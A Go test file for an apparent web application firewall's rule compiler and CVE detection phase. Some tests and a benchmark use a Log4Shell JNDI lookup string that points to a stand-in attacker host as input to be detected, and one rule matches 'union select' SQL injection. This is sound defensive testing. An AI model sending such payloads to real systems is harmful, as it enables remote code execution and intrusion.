package rules

import (
	"encoding/json"
	"net"
	"testing"

	"My-OpenWaf/internal/core/action"
	"My-OpenWaf/internal/core/pipeline"
	"My-OpenWaf/internal/store"
	"My-OpenWaf/internal/waf/cve"
)

var benchmarkCVEPhaseResult action.Result
var benchmarkCVEPhaseStop bool

func TestCompileAndMatchBlockIP(t *testing.T) {
	rules := []store.Rule{
		{Phase: store.PhaseACL, Pattern: "block_ip:192.168.1.0/24", Action: store.ActionIntercept, Enabled: true, Priority: 1},
	}
	compiled := Compile(rules)
	if len(compiled) != 1 {
		t.Fatalf("expected 1 compiled rule, got %d", len(compiled))
	}
	ctx := MatchCtx{ClientIP: net.ParseIP("192.168.1.50")}
	if !compiled[0].Match(ctx) {
		t.Fatal("expected match for 192.168.1.50")
	}
	ctx2 := MatchCtx{ClientIP: net.ParseIP("10.0.0.1")}
	if compiled[0].Match(ctx2) {
		t.Fatal("should not match 10.0.0.1")
	}
}

func TestCompileAndMatchAllowIP(t *testing.T) {
	rules := []store.Rule{
		{Phase: store.PhaseACL, Pattern: "allow_ip:10.0.0.1", Action: store.ActionAllow, Enabled: true, Priority: 1},
		{Phase: store.PhaseACL, Pattern: "block_ip:0.0.0.0/0", Action: store.ActionIntercept, Enabled: true, Priority: 10},
	}
	compiled := Compile(rules)
	if len(compiled) != 2 {
		t.Fatalf("expected 2 rules, got %d", len(compiled))
	}
	// allow_ip has lower priority → evaluated first
	ctx := MatchCtx{ClientIP: net.ParseIP("10.0.0.1")}
	if !compiled[0].Match(ctx) {
		t.Fatal("allow should match")
	}
	if action.Normalize(compiled[0].Action) != action.Allow {
		t.Fatal("first rule should be allow")
	}
}

func TestCompilePathRegex(t *testing.T) {
	rules := []store.Rule{
		{Phase: store.PhaseSignature, Pattern: "block_path_regex:(?i)/admin", Action: store.ActionIntercept, Enabled: true, Priority: 1},
	}
	compiled := Compile(rules)
	if len(compiled) != 1 {
		t.Fatalf("expected 1, got %d", len(compiled))
	}
	if !compiled[0].Match(MatchCtx{Path: "/Admin/dashboard"}) {
		t.Fatal("should match case-insensitive")
	}
	if compiled[0].Match(MatchCtx{Path: "/api/v1"}) {
		t.Fatal("should not match /api/v1")
	}
}

func TestCompileQueryRegex(t *testing.T) {
	rules := []store.Rule{
		{Phase: store.PhaseCustom, Pattern: "block_query_regex:(?i)union\\s+select", Action: store.ActionIntercept, Enabled: true, Priority: 1},
	}
	compiled := Compile(rules)
	if len(compiled) != 1 {
		t.Fatalf("expected 1, got %d", len(compiled))
	}
	if !compiled[0].Match(MatchCtx{Query: "id=1 UNION SELECT 1"}) {
		t.Fatal("should match union select")
	}
}

// 下面这些测试是 P0 修复"前端→后端序列化契约"的回归测试。
//
// 背景：规则对话框（rule-form-dialog.tsx）通过前端 mapper 把每条条件行
// 翻译为合法的 {kind, arg} 后再序列化为 compound JSON。回归测试必须证明：
//  1. 对话框会产出的每一种 (target, method) 组合都能被 Compile 接受；
//  2. 至少一个组合在匹配的请求上能命中；
//  3. 错误形态（前端 mapper 会拒绝的组合），落到后端不能侥幸匹配。
//
// 这些 JSON 字面量与 `frontend/.../rule-pattern-mapper.ts` 的输出严格对齐。

func TestCompileFrontendDialogURLPathContains(t *testing.T) {
	// 对应 UI: target=url_path / method=contains / content=/admin
	pattern := `{"kind":"path_contains","arg":"/admin"}`
	rule := store.Rule{
		Phase: store.PhaseCustom, Pattern: pattern,
		Action: store.ActionIntercept, Enabled: true, Priority: 1,
	}
	compiled := Compile([]store.Rule{rule})
	if len(compiled) != 1 {
		t.Fatalf("expected 1 rule, got %d", len(compiled))
	}
	if compiled[0].Kind != "compound" {
		t.Fatalf("expected compound kind, got %q", compiled[0].Kind)
	}
	if !compiled[0].Match(MatchCtx{Path: "/admin/login"}) {
		t.Fatal("should match /admin/login")
	}
	if compiled[0].Match(MatchCtx{Path: "/api/v1/health"}) {
		t.Fatal("should not match /api/v1/health")
	}
}

func TestCompileFrontendDialogURLPathExact(t *testing.T) {
	// 对应 UI: target=url_path / method=eq / content=/admin
	pattern := `{"kind":"block_path_exact","arg":"/admin"}`
	rule := store.Rule{
		Phase: store.PhaseCustom, Pattern: pattern,
		Action: store.ActionIntercept, Enabled: true, Priority: 1,
	}
	compiled := Compile([]store.Rule{rule})
	if len(compiled) != 1 {
		t.Fatalf("expected 1 rule, got %d", len(compiled))
	}
	if !compiled[0].Match(MatchCtx{Path: "/admin"}) {
		t.Fatal("should match /admin")
	}
	if compiled[0].Match(MatchCtx{Path: "/admin/login"}) {
		t.Fatal("should not match /admin/login (exact match only)")
	}
}

func TestCompileFrontendDialogBlockIPEqual(t *testing.T) {
	// 对应 UI: target=src_ip / method=eq / content=1.2.3.4
	pattern := `{"kind":"block_ip","arg":"1.2.3.4"}`
	rule := store.Rule{
		Phase: store.PhaseCustom, Pattern: pattern,
		Action: store.ActionIntercept, Enabled: true, Priority: 1,
	}
	compiled := Compile([]store.Rule{rule})
	if len(compiled) != 1 {
		t.Fatalf("expected 1 rule, got %d", len(compiled))
	}
	if !compiled[0].Match(MatchCtx{ClientIP: net.ParseIP("1.2.3.4")}) {
		t.Fatal("should match 1.2.3.4")
	}
	if compiled[0].Match(MatchCtx{ClientIP: net.ParseIP("5.6.7.8")}) {
		t.Fatal("should not match 5.6.7.8")
	}
}

func TestCompileFrontendDialogHostEqual(t *testing.T) {
	// 对应 UI: target=host / method=eq / content=example.com
	pattern := `{"kind":"host","arg":"example.com"}`
	rule := store.Rule{
		Phase: store.PhaseCustom, Pattern: pattern,
		Action: store.ActionIntercept, Enabled: true, Priority: 1,
	}
	compiled := Compile([]store.Rule{rule})
	if len(compiled) != 1 {
		t.Fatalf("expected 1 rule, got %d", len(compiled))
	}
	if !compiled[0].Match(MatchCtx{Host: "example.com"}) {
		t.Fatal("should match example.com")
	}
	if compiled[0].Match(MatchCtx{Host: "evil.com"}) {
		t.Fatal("should not match evil.com")
	}
}

func TestCompileFrontendDialogMethodEqual(t *testing.T) {
	// 对应 UI: target=method / method=eq / content=DELETE
	pattern := `{"kind":"block_method","arg":"DELETE"}`
	rule := store.Rule{
		Phase: store.PhaseCustom, Pattern: pattern,
		Action: store.ActionIntercept, Enabled: true, Priority: 1,
	}
	compiled := Compile([]store.Rule{rule})
	if len(compiled) != 1 {
		t.Fatalf("expected 1 rule, got %d", len(compiled))
	}
	if !compiled[0].Match(MatchCtx{Method: "DELETE"}) {
		t.Fatal("should match DELETE")
	}
	if compiled[0].Match(MatchCtx{Method: "GET"}) {
		t.Fatal("should not match GET")
	}
}

func TestCompileFrontendDialogCompoundAndMultiLines(t *testing.T) {
	// 对应 UI: 一个 AND 组内两行：url_path contains /api，且 host eq example.com
	pattern := `{"op":"and","children":[{"kind":"path_contains","arg":"/api"},{"kind":"host","arg":"example.com"}]}`
	rule := store.Rule{
		Phase: store.PhaseCustom, Pattern: pattern,
		Action: store.ActionIntercept, Enabled: true, Priority: 1,
	}
	compiled := Compile([]store.Rule{rule})
	if len(compiled) != 1 {
		t.Fatalf("expected 1 rule, got %d", len(compiled))
	}
	if compiled[0].Kind != "compound" {
		t.Fatalf("expected compound kind, got %q", compiled[0].Kind)
	}
	if !compiled[0].Match(MatchCtx{Path: "/api/v1", Host: "example.com"}) {
		t.Fatal("should match /api/v1 on example.com")
	}
	if compiled[0].Match(MatchCtx{Path: "/api/v1", Host: "evil.com"}) {
		t.Fatal("should not match /api/v1 on evil.com")
	}
}

func TestCompileFrontendDialogCompoundOrMultipleGroups(t *testing.T) {
	// 对应 UI: 两个 OR 组：(url_path contains /admin) OR (src_ip eq 10.0.0.1)
	pattern := `{"op":"or","children":[{"op":"and","children":[{"kind":"path_contains","arg":"/admin"}]},{"op":"and","children":[{"kind":"block_ip","arg":"10.0.0.1"}]}]}`
	rules := []store.Rule{
		{Phase: store.PhaseCustom, Pattern: pattern, Action: store.ActionIntercept, Enabled: true, Priority: 1},
	}
	compiled := Compile(rules)
	if len(compiled) != 1 {
		t.Fatalf("expected 1 rule, got %d", len(compiled))
	}
	if compiled[0].Kind != "compound" {
		t.Fatalf("expected compound kind, got %q", compiled[0].Kind)
	}
	if !compiled[0].Match(MatchCtx{Path: "/admin/login"}) {
		t.Fatal("should match /admin/login via URL path branch")
	}
	if !compiled[0].Match(MatchCtx{ClientIP: net.ParseIP("10.0.0.1")}) {
		t.Fatal("should match 10.0.0.1 via src_ip branch")
	}
	if compiled[0].Match(MatchCtx{Path: "/api", ClientIP: net.ParseIP("8.8.8.8")}) {
		t.Fatal("should not match unrelated request")
	}
}

func TestCompileFrontendDialogQueryParamEqual(t *testing.T) {
	// 对应 UI: target=get_param / method=eq / content="v" / paramName=id
	// 实际序列化: query_param:id:v
	pattern := `{"kind":"query_param","arg":"id:v"}`
	rule := store.Rule{
		Phase: store.PhaseCustom, Pattern: pattern,
		Action: store.ActionIntercept, Enabled: true, Priority: 1,
	}
	compiled := Compile([]store.Rule{rule})
	if len(compiled) != 1 {
		t.Fatalf("expected 1 rule, got %d", len(compiled))
	}
	// rawQuery 只接受裸 query，不要带 "?"。
	// 后端 queryParamMatcher 使用 url.ParseQuery 后逐项做 substrContains 匹配。
	if !compiled[0].Match(MatchCtx{Query: "id=v"}) {
		t.Fatal("should match id=v")
	}
	if compiled[0].Match(MatchCtx{Query: "id=w"}) {
		t.Fatal("should not match id=w")
	}
}

func TestCompileFrontendDialogHeaderEqual(t *testing.T) {
	// 对应 UI: target=req_header / method=eq / content="user-agent:bot"
	pattern := `{"kind":"block_header_exact","arg":"user-agent:bot"}`
	rule := store.Rule{
		Phase: store.PhaseCustom, Pattern: pattern,
		Action: store.ActionIntercept, Enabled: true, Priority: 1,
	}
	compiled := Compile([]store.Rule{rule})
	if len(compiled) != 1 {
		t.Fatalf("expected 1 rule, got %d", len(compiled))
	}
	if !compiled[0].Match(MatchCtx{Headers: map[string]string{"User-Agent": "bot"}}) {
		t.Fatal("should match UA bot")
	}
}

// 反例测试：旧 dialog 产出的 {target, method, content} 形态是本次 P0 缺陷的
// 反向证据。注意它并不会在 ParsePattern 阶段被过滤掉——ParsePattern 见首字符
// '{' 就返回 kind="compound"（compiler.go 行 139-141），所以规则会被保留、
// 计入 Compile 结果；真正的失效发生在 buildCompound 的 default 分支：
// Kind == "" 时返回 neverMatcher（matcher.go 行 1236-1239），于是规则
// 永不命中，等同于一条静默失效的空规则。
func TestCompileLegacyUnmappableLeafNeverMatches(t *testing.T) {
	legacyPattern := `{"target":"url_path","method":"contains","content":"/admin"}`
	rule := store.Rule{
		Phase: store.PhaseCustom, Pattern: legacyPattern,
		Action: store.ActionIntercept, Enabled: true, Priority: 1,
	}
	compiled := Compile([]store.Rule{rule})
	// 保留：ParsePattern 把它识别为 compound，不会被 Compile 跳过。
	if len(compiled) != 1 {
		t.Fatalf("legacy leaf should be kept as compound, got %d rules", len(compiled))
	}
	if compiled[0].Kind != "compound" {
		t.Fatalf("expected compound kind, got %q", compiled[0].Kind)
	}
	// 但永不命中：即使请求完全符合用户在 UI 上的本意也不会匹配。
	if compiled[0].Match(MatchCtx{Path: "/admin/login"}) {
		t.Fatal("legacy {target,method,content} leaf must never match")
	}
	if compiled[0].Match(MatchCtx{Path: "/anything", Host: "example.com", Method: "GET"}) {
		t.Fatal("legacy leaf must never match any request")
	}
	// 同时它在保存阶段就会被 ValidatePattern 拒绝（errs > 0），所以前端
	// 走 admin API 根本无法落库。此处只断言数量，不断言错误文案。
	_, _, errs := ValidatePattern(legacyPattern)
	if len(errs) == 0 {
		t.Fatal("legacy {target,method,content} leaf must be rejected by ValidatePattern")
	}
}

func TestCompileFrontendDialogHostRegex(t *testing.T) {
	// 对应 UI: target=host / method=regex / content=^api\.example\.com$
	// JSON 文本里反斜杠需转义一次，故 Go 反引号串中写 `\\.`。
	pattern := `{"kind":"host_regex","arg":"^api\\.example\\.com$"}`
	rule := store.Rule{
		Phase: store.PhaseCustom, Pattern: pattern,
		Action: store.ActionIntercept, Enabled: true, Priority: 1,
	}
	compiled := Compile([]store.Rule{rule})
	if len(compiled) != 1 {
		t.Fatalf("expected 1 rule, got %d", len(compiled))
	}
	if !compiled[0].Match(MatchCtx{Host: "api.example.com"}) {
		t.Fatal("should match api.example.com")
	}
	if compiled[0].Match(MatchCtx{Host: "api.example.org"}) {
		t.Fatal("should not match api.example.org")
	}
}

// 对应 UI: target=url（完整 URL）。修复前该目标错误映射到 path_contains /
// block_path_*，只看 ctx.Path，带 query 的条件永不命中，且与 url_path 目标
// 产出完全相同的规则。修复后走 full_url_contains / full_url_regex。
func TestCompileFrontendDialogFullURLContains(t *testing.T) {
	pattern := `{"kind":"full_url_contains","arg":"debug=1"}`
	rule := store.Rule{
		Phase: store.PhaseCustom, Pattern: pattern,
		Action: store.ActionIntercept, Enabled: true, Priority: 1,
	}
	compiled := Compile([]store.Rule{rule})
	if len(compiled) != 1 {
		t.Fatalf("expected 1 rule, got %d", len(compiled))
	}
	// 命中点必须在 query 段——这正是 path_contains 做不到的部分。
	if !compiled[0].Match(MatchCtx{Path: "/api/v1", Query: "debug=1"}) {
		t.Fatal("should match debug=1 in query")
	}
	if compiled[0].Match(MatchCtx{Path: "/api/v1", Query: "debug=0"}) {
		t.Fatal("should not match debug=0")
	}
}

func TestCompileFrontendDialogFullURLRegexExact(t *testing.T) {
	// 对应 UI: target=url / method=eq / content=/a?b=1
	// 后端无 full_url 精确 kind，映射器用锚定正则表达 eq。
	pattern := `{"kind":"full_url_regex","arg":"^/a\\?b=1$"}`
	rule := store.Rule{
		Phase: store.PhaseCustom, Pattern: pattern,
		Action: store.ActionIntercept, Enabled: true, Priority: 1,
	}
	compiled := Compile([]store.Rule{rule})
	if len(compiled) != 1 {
		t.Fatalf("expected 1 rule, got %d", len(compiled))
	}
	if !compiled[0].Match(MatchCtx{Path: "/a", Query: "b=1"}) {
		t.Fatal("should match /a?b=1")
	}
	if compiled[0].Match(MatchCtx{Path: "/a", Query: "b=1&c=2"}) {
		t.Fatal("anchored regex should not match /a?b=1&c=2")
	}
}

// 对应 UI: target=src_ip / method=not_in_cidr。映射器返回 wrapNot=true，
// rowsToCompoundNode 把叶子包成 {op:"not", children:[...]}。
// 后端 buildCompound 的 not 分支要求 children 非空且只取 children[0]
// （matcher.go 行 1201-1205）。
func TestCompileFrontendDialogNotInCIDR(t *testing.T) {
	pattern := `{"op":"not","children":[{"kind":"block_ip","arg":"10.0.0.0/8"}]}`
	rule := store.Rule{
		Phase: store.PhaseCustom, Pattern: pattern,
		Action: store.ActionIntercept, Enabled: true, Priority: 1,
	}
	compiled := Compile([]store.Rule{rule})
	if len(compiled) != 1 {
		t.Fatalf("expected 1 rule, got %d", len(compiled))
	}
	// 段内 IP 不命中，段外 IP 命中——这是 not 的正确方向。
	if compiled[0].Match(MatchCtx{ClientIP: net.ParseIP("10.1.2.3")}) {
		t.Fatal("10.1.2.3 is inside 10.0.0.0/8, must not match")
	}
	if !compiled[0].Match(MatchCtx{ClientIP: net.ParseIP("8.8.8.8")}) {
		t.Fatal("8.8.8.8 is outside 10.0.0.0/8, must match")
	}
}

// not 叶子出现在 AND 组内的形态：(url_path contains /api) AND (src_ip 不在 10/8)。
func TestCompileFrontendDialogNotInsideAndGroup(t *testing.T) {
	pattern := `{"op":"and","children":[{"kind":"path_contains","arg":"/api"},{"op":"not","children":[{"kind":"block_ip","arg":"10.0.0.0/8"}]}]}`
	rule := store.Rule{
		Phase: store.PhaseCustom, Pattern: pattern,
		Action: store.ActionIntercept, Enabled: true, Priority: 1,
	}
	compiled := Compile([]store.Rule{rule})
	if len(compiled) != 1 {
		t.Fatalf("expected 1 rule, got %d", len(compiled))
	}
	if !compiled[0].Match(MatchCtx{Path: "/api/v1", ClientIP: net.ParseIP("8.8.8.8")}) {
		t.Fatal("should match /api from outside 10.0.0.0/8")
	}
	if compiled[0].Match(MatchCtx{Path: "/api/v1", ClientIP: net.ParseIP("10.1.2.3")}) {
		t.Fatal("should not match /api from inside 10.0.0.0/8")
	}
}

// 对应 UI: target=src_ip / method=not_in_geo，geo_block arg 为 CSV 国家码。
func TestCompileFrontendDialogNotInGeo(t *testing.T) {
	pattern := `{"op":"not","children":[{"kind":"geo_block","arg":"CN"}]}`
	rule := store.Rule{
		Phase: store.PhaseCustom, Pattern: pattern,
		Action: store.ActionIntercept, Enabled: true, Priority: 1,
	}
	compiled := Compile([]store.Rule{rule})
	if len(compiled) != 1 {
		t.Fatalf("expected 1 rule, got %d", len(compiled))
	}
	if compiled[0].Kind != "compound" {
		t.Fatalf("expected compound kind, got %q", compiled[0].Kind)
	}
}

// 反例测试：负向先行断言 `(?!` 是 Go RE2 明确不支持的 Perl 语法。
// 映射器早期版本用 `^(?!.*x).*$` 表达「不等于 / 不包含」，会让 ValidatePattern
// 直接报错、规则 100% 保存失败。这里锁死该行为，防止反向语义再退回正则实现。
func TestValidatePatternRejectsNegativeLookahead(t *testing.T) {
	patterns := []string{
		`{"kind":"full_url_regex","arg":"^(?!.*/healthz).*$"}`,
		`{"kind":"block_path_regex","arg":"^(?!.*/healthz).*$"}`,
		`{"kind":"body_regex","arg":"^(?!.*passwd).*$"}`,
		`{"kind":"header_regex","arg":"User-Agent:^(?!.*bot).*$"}`,
		`{"kind":"query_param_regex","arg":"id:^(?!.*v).*$"}`,
	}
	for _, pattern := range patterns {
		_, _, errs := ValidatePattern(pattern)
		if len(errs) == 0 {
			t.Fatalf("negative lookahead pattern must be rejected: %s", pattern)
		}
	}
}

// host_regex 使用 Go RE2 语法；不支持的负向先行断言必须在保存期拒绝，
// 即使绕过保存校验进入编译路径，也必须退化为 neverMatcher。
func TestHostRegexInvalidPatternRejected(t *testing.T) {
	pattern := `{"kind":"host_regex","arg":"^(?!.*example).*$"}`
	if _, _, errs := ValidatePattern(pattern); len(errs) == 0 {
		t.Fatal("invalid host_regex should be rejected during validation")
	}
	compiled := Compile([]store.Rule{{
		Phase: store.PhaseCustom, Pattern: pattern,
		Action: store.ActionIntercept, Enabled: true, Priority: 1,
	}})
	if len(compiled) != 1 {
		t.Fatalf("expected 1 rule, got %d", len(compiled))
	}
	if compiled[0].Match(MatchCtx{Host: "other.com"}) {
		t.Fatal("invalid host_regex must not match anything")
	}
}

func TestCompileFailsClosedForInvalidPersistedPatterns(t *testing.T) {
	patterns := []string{
		`{"kind":"unknown","arg":"x"}`,
		`{"op":"not","children":[{"kind":"unknown","arg":"x"}]}`,
		`{"op":"or","children":[{"kind":"unknown","arg":"x"},{"kind":"block_path","arg":"/admin"}]}`,
		`{"op":"if_else","if":{"kind":"block_path","arg":"/admin"},"then":{"kind":"block_method","arg":"GET"},"else":{"kind":"unknown","arg":"x"}}`,
	}
	contexts := []MatchCtx{
		{Path: "/admin", Method: "GET"},
		{Path: "/other", Method: "POST"},
	}

	for _, pattern := range patterns {
		t.Run(pattern, func(t *testing.T) {
			compiled := Compile([]store.Rule{{
				Phase: store.PhaseCustom, Pattern: pattern,
				Action: store.ActionIntercept, Enabled: true, Priority: 1,
			}})
			if len(compiled) != 1 {
				t.Fatalf("expected 1 rule, got %d", len(compiled))
			}
			for _, ctx := range contexts {
				if compiled[0].Match(ctx) {
					t.Fatalf("invalid persisted pattern must fail closed: %s", pattern)
				}
			}
		})
	}
}

// 逐条穷举「对话框会产出的全部 pattern 形态」，断言它们都能通过
// ValidatePattern（errs == 0）且不会退化成 neverMatcher。
// 只断言 len(errs)，不断言错误文案。
func TestValidatePatternAcceptsAllDialogShapes(t *testing.T) {
	// 与 frontend/app/(dashboard)/rules/components/rule-pattern-mapper.ts
	// 的 translate* 分支一一对应。
	patterns := []struct {
		name    string
		pattern string
	}{
		{"src_ip eq", `{"kind":"block_ip","arg":"1.2.3.4"}`},
		{"src_ip in_cidr", `{"kind":"block_ip","arg":"10.0.0.0/8"}`},
		{"src_ip not_in_cidr", `{"op":"not","children":[{"kind":"block_ip","arg":"10.0.0.0/8"}]}`},
		{"src_ip in_geo", `{"kind":"geo_block","arg":"CN"}`},
		{"src_ip not_in_geo", `{"op":"not","children":[{"kind":"geo_block","arg":"CN"}]}`},
		{"url eq", `{"kind":"full_url_regex","arg":"^/a\\?b=1$"}`},
		{"url contains", `{"kind":"full_url_contains","arg":"debug=1"}`},
		{"url regex", `{"kind":"full_url_regex","arg":"^/api/.*$"}`},
		{"url ne", `{"op":"not","children":[{"kind":"full_url_contains","arg":"/healthz"}]}`},
		{"url_path eq", `{"kind":"block_path_exact","arg":"/admin"}`},
		{"url_path contains", `{"kind":"path_contains","arg":"/admin"}`},
		{"url_path regex", `{"kind":"block_path_regex","arg":"^/admin/.*$"}`},
		{"url_path ne", `{"kind":"path_not_contains","arg":"/healthz"}`},
		{"host eq", `{"kind":"host","arg":"example.com"}`},
		{"host contains", `{"kind":"host_contains","arg":"example"}`},
		{"host regex", `{"kind":"host_regex","arg":"^api\\.example\\.com$"}`},
		{"host ne", `{"kind":"host_not_contains","arg":"example.com"}`},
		{"get_param eq", `{"kind":"query_param","arg":"id:v"}`},
		{"get_param regex", `{"kind":"query_param_regex","arg":"id:^[0-9]+$"}`},
		{"get_param ne", `{"op":"not","children":[{"kind":"query_param","arg":"id:v"}]}`},
		{"req_header eq", `{"kind":"block_header_exact","arg":"User-Agent:bot"}`},
		{"req_header contains", `{"kind":"block_header","arg":"User-Agent:bot"}`},
		{"req_header regex", `{"kind":"header_regex","arg":"User-Agent:^bot.*$"}`},
		{"req_header ne", `{"op":"not","children":[{"kind":"block_header","arg":"User-Agent:bot"}]}`},
		{"req_body contains", `{"kind":"body_contains","arg":"passwd"}`},
		{"req_body regex", `{"kind":"body_regex","arg":"pass(word)?"}`},
		{"req_body ne", `{"op":"not","children":[{"kind":"body_contains","arg":"passwd"}]}`},
		{"method eq", `{"kind":"block_method","arg":"DELETE"}`},
		{"ja4 eq", `{"kind":"tls_ja4","arg":"t13d1516h2_8daaf6152771_02713d6af862"}`},
		{"and group", `{"op":"and","children":[{"kind":"path_contains","arg":"/api"},{"kind":"host","arg":"example.com"}]}`},
		{"or of and groups", `{"op":"or","children":[{"op":"and","children":[{"kind":"path_contains","arg":"/admin"}]},{"op":"and","children":[{"kind":"block_ip","arg":"10.0.0.1"}]}]}`},
	}

	for _, tc := range patterns {
		t.Run(tc.name, func(t *testing.T) {
			kind, _, errs := ValidatePattern(tc.pattern)
			if len(errs) != 0 {
				t.Fatalf("ValidatePattern(%s) returned %d errors: %v", tc.pattern, len(errs), errs)
			}
			if kind != "compound" {
				t.Fatalf("expected compound kind, got %q", kind)
			}
			compiled := Compile([]store.Rule{{
				Phase: store.PhaseCustom, Pattern: tc.pattern,
				Action: store.ActionIntercept, Enabled: true, Priority: 1,
			}})
			if len(compiled) != 1 {
				t.Fatalf("expected 1 compiled rule, got %d", len(compiled))
			}
			if _, isNever := compiled[0].matcher.(*neverMatcher); isNever {
				t.Fatalf("pattern %s compiled to neverMatcher", tc.pattern)
			}
		})
	}
}

func TestMixedRulePriority(t *testing.T) {
	rules := []store.Rule{
		{Phase: store.PhaseACL, Pattern: "block_ip:0.0.0.0/0", Action: store.ActionIntercept, Enabled: true, Priority: 100},
		{Phase: store.PhaseACL, Pattern: "allow_ip:10.0.0.0/8", Action: store.ActionAllow, Enabled: true, Priority: 1},
	}
	compiled := Compile(rules)
	// Priority 1 should come first
	if compiled[0].Kind != "allow_ip" {
		t.Fatalf("expected allow_ip first, got %s", compiled[0].Kind)
	}
}

func TestCVEDetectorRuleOverridePreventsAutoDrop(t *testing.T) {
	cfg := store.DefaultProtectionConfig()
	cfg.CVEEnabled = true
	cfg.CVEAction = "intercept"
	cfg.CVEAutoDropCritical = true
	cfg.CVEAutoDropHigh = true
	cfg.CVERulesConfig = `{"CVE-2021-44228":{"action":"rate_limit"}}`

	phase := &cvePhase{cfg: &cfg, detector: cve.NewCVEDetector()}
	result, stop := phase.Execute(&pipeline.RequestCtx{
		Path:     "/",
		RawQuery: "x=${jndi:ldap://evil.example/a}",
		Headers:  map[string]string{},
	})
	if !stop {
		t.Fatal("expected CVE hit to stop the pipeline")
	}
	if result.Type != action.RateLimit {
		t.Fatalf("expected explicit rule action to win, got %q", result.Type)
	}
	if result.ResponseStatusCode() != 429 {
		t.Fatalf("expected rate limit status 429, got %d", result.ResponseStatusCode())
	}
}

func TestCVEDetectorPatternOverridePreventsAutoDrop(t *testing.T) {
	cfg := store.DefaultProtectionConfig()
	cfg.CVEEnabled = true
	cfg.CVEAction = "intercept"
	cfg.CVEAutoDropCritical = true
	cfg.CVEAutoDropHigh = true
	rawQuery := "x=${jndi:ldap://evil.example/a}"
	req := cve.BuildCVERequest("/", rawQuery, map[string]string{}, nil, "")
	matches := cve.NewCVEDetector().Detect(req)
	if len(matches) == 0 {
		t.Fatal("expected test request to produce CVE matches")
	}
	overrides := make(map[string]cve.CVERuleOverride, len(matches))
	for _, match := range matches {
		overrides[match.Pattern] = cve.CVERuleOverride{Action: "rate_limit"}
	}
	rawOverrides, err := json.Marshal(overrides)
	if err != nil {
		t.Fatalf("marshal CVE pattern overrides: %v", err)
	}
	cfg.CVERulesConfig = string(rawOverrides)

	phase := &cvePhase{cfg: &cfg, detector: cve.NewCVEDetector()}
	result, stop := phase.Execute(&pipeline.RequestCtx{
		Path:     "/",
		RawQuery: rawQuery,
		Headers:  map[string]string{},
	})
	if !stop {
		t.Fatal("expected CVE hit to stop the pipeline")
	}
	if result.Type != action.RateLimit {
		t.Fatalf("expected pattern override action to win, got %q", result.Type)
	}
}

func TestCVEDisabledRuleOverridePassesWhenAllMatchesDisabled(t *testing.T) {
	cfg := store.DefaultProtectionConfig()
	cfg.CVEEnabled = true
	rawQuery := "x=${jndi:ldap://evil.example/a}"
	req := cve.BuildCVERequest("/", rawQuery, map[string]string{}, nil, "")
	matches := cve.NewCVEDetector().Detect(req)
	if len(matches) == 0 {
		t.Fatal("expected test request to produce CVE matches")
	}
	disabled := false
	overrides := make(map[string]cve.CVERuleOverride, len(matches))
	for _, match := range matches {
		overrides[match.CVEID] = cve.CVERuleOverride{Enabled: &disabled}
	}
	rawOverrides, err := json.Marshal(overrides)
	if err != nil {
		t.Fatalf("marshal CVE overrides: %v", err)
	}
	cfg.CVERulesConfig = string(rawOverrides)

	phase := &cvePhase{cfg: &cfg, detector: cve.NewCVEDetector()}
	result, stop := phase.Execute(&pipeline.RequestCtx{
		Path:     "/",
		RawQuery: rawQuery,
		Headers:  map[string]string{},
	})
	if stop {
		t.Fatal("expected disabled CVE rules to pass")
	}
	if result != action.Pass() {
		t.Fatalf("expected pass result, got %#v", result)
	}
}

func TestNewCVEPhaseCachesRuntimeConfig(t *testing.T) {
	cfg := store.DefaultProtectionConfig()
	cfg.CVEEnabled = true
	cfg.CategorySensitivity = `{"cve_general":"off"}`
	cfg.CVERulesConfig = `{"CVE-2021-44228":{"action":"rate_limit","status_code":429,"redirect_to":"/blocked"}}`

	phase := NewCVEPhase(&cfg, cve.NewCVEDetector()).(*cvePhase)
	if !phase.cachedConfig {
		t.Fatal("expected CVE phase config cache to be initialized")
	}
	if got := phase.categorySensitivity["cve_general"]; got != "off" {
		t.Fatalf("expected cached cve_general sensitivity off, got %q", got)
	}
	override, ok := phase.ruleOverrides["CVE-2021-44228"]
	if !ok {
		t.Fatal("expected cached CVE rule override")
	}
	if override.Action != "rate_limit" || override.StatusCode != 429 || override.RedirectTo != "/blocked" {
		t.Fatalf("unexpected cached override: %#v", override)
	}
}

func BenchmarkCVEPhaseCleanTraffic(b *testing.B) {
	cfg := store.DefaultProtectionConfig()
	cfg.CVEEnabled = true
	phase := NewCVEPhase(&cfg, cve.NewCVEDetector()).(*cvePhase)
	ctx := &pipeline.RequestCtx{
		Path:        "/api/login",
		RawQuery:    "page=1&sort=name",
		Headers:     map[string]string{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Host": "example.com", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8"},
		Body:        []byte(`{"username":"admin","password":"test123"}`),
		ContentType: "application/json",
	}

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		benchmarkCVEPhaseResult, benchmarkCVEPhaseStop = phase.Execute(ctx)
	}
}

func BenchmarkCVEPhaseLog4ShellTraffic(b *testing.B) {
	cfg := store.DefaultProtectionConfig()
	cfg.CVEEnabled = true
	phase := NewCVEPhase(&cfg, cve.NewCVEDetector()).(*cvePhase)
	ctx := &pipeline.RequestCtx{
		Path:     "/",
		RawQuery: "x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D",
		Headers:  map[string]string{},
	}

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		benchmarkCVEPhaseResult, benchmarkCVEPhaseStop = phase.Execute(ctx)
	}
}
